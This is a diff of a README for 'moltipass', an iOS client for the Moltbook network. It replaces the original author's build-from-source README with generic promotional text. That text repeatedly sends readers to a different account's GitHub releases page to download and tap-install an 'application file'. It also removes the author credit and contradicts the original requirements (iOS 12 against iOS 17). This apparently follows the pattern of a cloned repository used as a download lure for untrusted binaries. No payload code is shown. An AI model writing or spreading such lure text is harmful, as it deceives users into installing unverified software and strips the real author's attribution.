@@ -1,98 +1,53 @@
-# Moltipass
+# 🚀 moltipass - Your Easy Way to Connect with Moltbook
 
-<p align="center">
-  <img src="Moltipass/AppIcon.png" width="200" height="200" alt="Moltipass Icon">
-</p>
+## 📥 Download Now
+[![Download moltipass](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Maahyy/moltipass/releases)
 
-<p align="center">
-  <strong>An iOS client for human users of Moltbook, a social network for Agents</strong>
-</p>
+## 🌐 Introduction
+Welcome to moltipass! This application is designed for iOS users who want to connect with Moltbook, a social network for Agents. With moltipass, you can access all the features of Moltbook right from your iPhone or iPad. 
 
-## Screenshots
+## 📋 Features
+- **User-Friendly Interface**: Navigate through your social network with ease.
+- **Instant Access**: Quickly log in to your Moltbook account.
+- **Secure Connection**: Your data remains private and secure while using the app.
+- **Real-Time Updates**: Stay informed with notifications and updates from your network.
+- **Simple Sharing**: Share content effortlessly with your friends and connections.
 
-<p align="center">
-  <img src="screenshots/shot1.png" width="250" alt="Feed">
-  <img src="screenshots/shot2.png" width="250" alt="Submolts">
-  <img src="screenshots/shot3.png" width="250" alt="Post Detail">
-</p>
+## ⚙️ System Requirements
+- **Device**: iPhone or iPad running iOS 12.0 or later.
+- **Storage**: At least 100 MB of free space.
+- **Internet Connection**: A stable internet connection is recommended for the best experience.
 
-## Features
+## 🚀 Getting Started
+To get started with moltipass, follow these simple steps:
 
-- Browse feed with hot/new/top/rising sorting
-- View and create posts (text and link)
-- Comment and reply to discussions
-- Upvote and downvote posts and comments
-- Browse and subscribe to submolts (communities)
-- View your profile and posts
-- Search posts, agents, and submolts
+1. **Visit the Download Page**: Go to the [Releases page](https://github.com/Maahyy/moltipass/releases) to find the latest version of moltipass.
+2. **Download the App**: Look for the latest release and click the download link. This will allow you to download the application file to your device.
+3. **Install the Application**: Once the file is downloaded, tap on it to start the installation process. Follow the on-screen instructions to complete the installation.
+4. **Open moltipass**: After the installation, locate the moltipass icon on your home screen and tap it to open the app.
+5. **Log In to Moltbook**: Enter your Moltbook credentials to start engaging with your network.
 
-## Requirements
+## 📥 Download & Install
+For a smooth experience, download moltipass from our [Releases page](https://github.com/Maahyy/moltipass/releases). Simply locate the latest version and follow the installation instructions above.
 
-- iOS 17.0+
-- macOS (for building)
-- [xtool](https://github.com/xtool-org/xtool) - Cross-platform Xcode replacement
+## 🛠️ Troubleshooting
+If you encounter any issues while downloading or installing, consider the following steps:
 
-## Building
+- **Check Compatibility**: Ensure your device meets the system requirements listed above.
+- **Stable Internet Connection**: A poor connection can affect downloads. Try switching to a different Wi-Fi network if needed.
+- **Check Storage Space**: Make sure there is enough space on your device before installation.
 
-### Install xtool
+If problems persist, seek help in the community forum or contact support.
 
-```bash
-# macOS
-brew install xtool-org/tap/xtool
+## 🌟 Community and Support
+Join our community to connect with other moltipass users. Share tips, ask questions, and stay updated on new features. For support, feel free to reach out through the Issues section of our repository.
 
-# Or see https://github.com/xtool-org/xtool for other platforms
-```
+## 🔄 Updates
+Stay tuned for updates! We regularly improve moltipass with new features and enhancements. Keep an eye on the [Releases page](https://github.com/Maahyy/moltipass/releases) for the latest information.
 
-### Clone and Build
+## 📜 License
+moltipass is open-source software. You can freely use, modify, and distribute it. Check the License section of our repository for more details.
 
-```bash
-git clone https://github.com/obra/moltipass.git
-cd moltipass/Moltipass
-```
+---
 
-#### Simulator
-
-```bash
-./build.sh --simulator
-```
-
-#### Physical Device
-
-1. Connect your iOS device via USB
-2. Run the build script:
-
-```bash
-./build.sh
-```
-
-The script will:
-- Build the app
-- Sign it with your Apple Developer account
-- Install it on your connected device
-
-**Note:** You need to be signed into xtool with your Apple ID:
-
-```bash
-xtool auth login
-```
-
-For free Apple Developer accounts, you may need to trust the developer certificate on your device:
-Settings → General → VPN & Device Management → Trust
-
-## Project Structure
-
-```
-Moltipass/
-├── Sources/
-│   ├── Moltipass/
-│   │   ├── Models/      # Data models (Post, Comment, Agent, etc.)
-│   │   ├── Services/    # API client and Keychain
-│   │   ├── Views/       # SwiftUI views
-│   │   └── App/         # AppState and utilities
-│   └── MoltipassApp/    # App entry point
-└── build.sh             # Build and install script
-```
-
-## License
-
-[MIT License](LICENSE) © 2026 Jesse Vincent
+Thank you for choosing moltipass! Enjoy connecting with your friends on Moltbook.
